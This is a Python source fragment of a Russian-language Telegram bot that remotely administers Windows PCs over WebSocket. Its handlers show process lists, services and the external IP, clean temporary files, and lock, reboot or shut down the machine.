async def cb_act_fdns(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    await callback.answer("⏳ Очистка DNS...")
    res = await session_manager.send_command(client_id, "flush_dns")
    msg = res.get("data", {}).get("output", "Выполнено")
    await callback.message.answer(f"🧹 <b>Сброс DNS:</b>\n<code>{msg}</code>", parse_mode="HTML")


@router.callback_query(F.data.startswith("act_extip:"))
async def cb_act_extip(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    await callback.answer()
    res = await session_manager.send_command(client_id, "external_ip")
    if res.get("status") == "success":
        data = res["data"].get("data", {})
        ip = data.get("ip", "Не определен")
        await callback.message.answer(f"🌐 <b>Внешний белый IP:</b> <code>{ip}</code>", parse_mode="HTML")


# ==================== ПРОЦЕССЫ И СЛУЖБЫ ====================

@router.callback_query(F.data.startswith("cat_proc:"))
async def cb_cat_proc(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="⚡️ Топ-10 по CPU", callback_data=f"act_topcpu:{client_id}"),
            InlineKeyboardButton(text="🧠 Топ-10 по RAM", callback_data=f"act_topram:{client_id}")
        ],
        [
            InlineKeyboardButton(text="⚙️ Службы Windows", callback_data=f"act_svcs:{client_id}"),
            InlineKeyboardButton(text="⬅️ В меню ПК", callback_data=f"sel_cli:{client_id}")
        ]
    ])
    await callback.message.edit_text("⚙️ <b>Категория: Процессы и системные службы</b>", parse_mode="HTML", reply_markup=kb)
    await callback.answer()


@router.callback_query(F.data.startswith("act_topcpu:"))
async def cb_act_topcpu(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    await callback.answer("⏳ Анализ процессов...")
    res = await session_manager.send_command(client_id, "top_cpu")
    if res.get("status") == "success":
        procs = res["data"]
        text = "⚡️ <b>Топ процессов по нагрузке CPU:</b>\n\n"
        for p in procs:
            text += f"• <code>{p['pid']}</code> | <b>{p['name']}</b>: {p['cpu']}% CPU ({p['ram_mb']} MB)\n"
        await callback.message.answer(text, parse_mode="HTML")


@router.callback_query(F.data.startswith("act_topram:"))
async def cb_act_topram(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    await callback.answer("⏳ Анализ памяти...")
    res = await session_manager.send_command(client_id, "top_ram")
    if res.get("status") == "success":
        procs = res["data"]
        text = "🧠 <b>Топ процессов по потреблению RAM:</b>\n\n"
        for p in procs:
            text += f"• <code>{p['pid']}</code> | <b>{p['name']}</b>: <b>{p['ram_mb']} MB</b> ({p['ram_percent']}%)\n"
        await callback.message.answer(text, parse_mode="HTML")


@router.callback_query(F.data.startswith("act_svcs:"))
async def cb_act_svcs(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    await callback.answer()
    res = await session_manager.send_command(client_id, "services_list")
    if res.get("status") == "success":
        svcs = res["data"]
        text = "⚙️ <b>Системные службы Windows:</b>\n\n"
        for s in svcs:
            status = "🟢" if s['status'] == 'running' else "⚪️"
            text += f"{status} <b>{s['display_name']}</b> (<code>{s['name']}</code>)\n"
        await callback.message.answer(text, parse_mode="HTML")


# ==================== ОБСЛУЖИВАНИЕ И МОДАЛЬНЫЕ ОКНА ====================

@router.callback_query(F.data.startswith("cat_maint:"))
async def cb_cat_maint(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="💬 Модальное окно (ввод текста)", callback_data=f"prompt_modal:{client_id}")
        ],
        [
            InlineKeyboardButton(text="🧹 Очистить %TEMP%", callback_data=f"act_ctemp:{client_id}"),
            InlineKeyboardButton(text="🔒 Заблокировать экран", callback_data=f"act_lock:{client_id}")
        ],
        [
            InlineKeyboardButton(text="🔄 Перезагрузить ПК", callback_data=f"act_reboot:{client_id}"),
            InlineKeyboardButton(text="🛑 Выключить ПК", callback_data=f"act_off:{client_id}")
        ],
        [
            InlineKeyboardButton(text="❌ Отмена выключения", callback_data=f"act_cshut:{client_id}"),
            InlineKeyboardButton(text="⬅️ В меню ПК", callback_data=f"sel_cli:{client_id}")
        ]
    ])
    await callback.message.edit_text("🛠 <b>Категория: Обслуживание и важные окна</b>", parse_mode="HTML", reply_markup=kb)
    await callback.answer()


@router.callback_query(F.data.startswith("act_ctemp:"))
async def cb_act_ctemp(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    await callback.answer("⏳ Очистка временных файлов...")
    res = await session_manager.send_command(client_id, "clean_temp")
    if res.get("status") == "success":
        d = res["data"]
        text = (
            f"🧹 <b>Очистка временных файлов (%TEMP%):</b>\n\n"
            f"• <b>Освобождено места:</b> <b>{d['freed_mb']} MB</b>\n"
            f"• <b>Удалено файлов:</b> {d['deleted_files']}\n"
            f"• <b>Удалено папок:</b> {d['deleted_folders']}"
        )
        await callback.message.answer(text, parse_mode="HTML")


@router.callback_query(F.data.startswith("act_lock:"))
async def cb_act_lock(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    await callback.answer()
    res = await session_manager.send_command(client_id, "lock_workstation")
    await callback.message.answer(f"🔒 {res.get('data', {}).get('message', 'Выполнено')}")


@router.callback_query(F.data.startswith("act_reboot:"))
async def cb_act_reboot(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    await callback.answer("⏳ Перезагрузка...")
    res = await session_manager.send_command(client_id, "reboot", {"delay": 30})
    await callback.message.answer(f"🔄 {res.get('data', {}).get('message', 'Команда отправлена')}")


@router.callback_query(F.data.startswith("act_off:"))
async def cb_act_off(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    await callback.answer("⏳ Выключение...")
    res = await session_manager.send_command(client_id, "shutdown", {"delay": 30})
    await callback.message.answer(f"🛑 {res.get('data', {}).get('message', 'Команда отправлена')}")


@router.callback_query(F.data.startswith("act_cshut:"))
async def cb_act_cshut(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    await callback.answer()
    res = await session_manager.send_command(client_id, "cancel_shutdown")
    await callback.message.answer(f"❌ {res.get('data', {}).get('message', 'Отменено')}")


@router.callback_query(F.data.startswith("act_ping:"))
async def cb_ping(callback: CallbackQuery):
    client_id = callback.data.split(":", 1)[1]
    import time
    start = time.monotonic()
    try:
        await session_manager.send_command(client_id, "ping", timeout=5.0)
        ms = round((time.monotonic() - start) * 1000, 1)
        await callback.answer(f"🏓 Pong! WebSocket отклик: {ms} мс", show_alert=True)
    except Exception as e:
        await callback.answer(f"❌ Ошибка пинга: {str(e)}", show_alert=True)
